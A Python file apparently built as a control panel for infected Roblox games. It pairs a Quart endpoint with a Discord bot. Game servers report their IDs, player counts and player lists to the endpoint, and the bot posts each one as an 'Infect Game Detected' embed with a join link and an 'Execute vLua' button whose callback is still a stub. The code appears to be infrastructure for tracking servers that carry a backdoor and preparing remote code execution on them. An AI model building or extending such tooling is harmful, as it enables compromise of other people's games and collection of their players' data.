import discord
import os
import asyncio
from quart import Quart, request

app = Quart(__name__)
intents = discord.Intents.default()
intents.message_content = True 
bot = discord.Client(intents=intents)

# This handles the buttons for the message
class GameControlView(discord.ui.View):
    def __init__(self, place_id, job_id):
        super().__init__(timeout=None)
        # Button 1: Join Game
        join_url = f"https://www.roblox.com/games/start?placeId={place_id}&gameInstanceId={job_id}"
        self.add_item(discord.ui.Button(label="🎮 Join Game", url=join_url))
        
    @discord.ui.button(label="💻 Execute vLua", style=discord.ButtonStyle.danger)
    async def execute_callback(self, interaction, button):
        # You can add a Modal here later for code input!
        await interaction.response.send_message("Execution signal ready!", ephemeral=True)

@app.route('/')
async def home():
    return "<h1>Bridge UI Online</h1>", 200

@app.route('/update-stats', methods=['POST'])
async def update_stats():
    data = await request.get_json()
    asyncio.create_task(send_detailed_embed(data))
    return {"status": "success"}, 200

async def send_detailed_embed(data):
    channel = bot.get_channel(int(os.getenv("CHANNEL_ID")))
    if channel and bot.is_ready():
        embed = discord.Embed(
            title=f"📡 Infect Game Detected: {data.get('name')}",
            url=f"https://www.roblox.com/games/{data.get('place_id')}",
            color=discord.Color.from_rgb(255, 0, 0)
        )
        
        embed.add_field(name="📊 Statistics", value=f"**Players:** `{data.get('players')}/{data.get('max_players')}`\n**Ping:** `{data.get('ping')}ms`", inline=True)
        embed.add_field(name="🆔 Identifiers", value=f"**Place:** `{data.get('place_id')}`\n**Job:** `{data.get('job_id', 'N/A')[:10]}...`", inline=True)
        embed.add_field(name="🕵️ Activity", value=f"```{data.get('player_list', 'No details')}```", inline=False)
        embed.set_footer(text="yunito's detection system • v2.0")
        
        # Add the buttons!
        view = GameControlView(data.get('place_id'), data.get('job_id'))
        
        await channel.send(embed=embed, view=view)

@app.before_serving
async def startup():
    asyncio.create_task(bot.start(os.getenv("DISCORD_TOKEN")))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
